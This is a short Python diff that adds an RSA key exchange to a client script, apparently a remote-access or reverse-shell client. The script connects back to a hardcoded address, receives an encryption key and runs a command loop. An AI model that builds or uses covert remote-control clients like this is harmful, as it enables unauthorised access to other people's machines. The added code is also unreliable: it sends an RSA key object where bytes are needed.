@@ -3,6 +3,16 @@ import socket
 from cryptography.fernet import Fernet
 import time
 import os
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
+def rsa_decrypt(server):
+    anahtar_cifti = RSA.generate(2048)
+    public_key = anahtar_cifti.publickey()
+    private_key = anahtar_cifti
+    server.sendall(public_key)
+    key=server.recv(2048)
+    cipher_dec = PKCS1_OAEP.new(private_key)
+    return cipher_dec.decrypt(key)
 def geri():
     try:
         os.chdir("..")
@@ -88,8 +98,8 @@ def main():
             client.connect(("192.168.1.165", 8080))
             
           
-            key = client.recv(4096).decode()
-            fer = Fernet(key)
+            key=rsa_decrypt(client)
+            fer=Fernet(key)
             
             while True: 
             
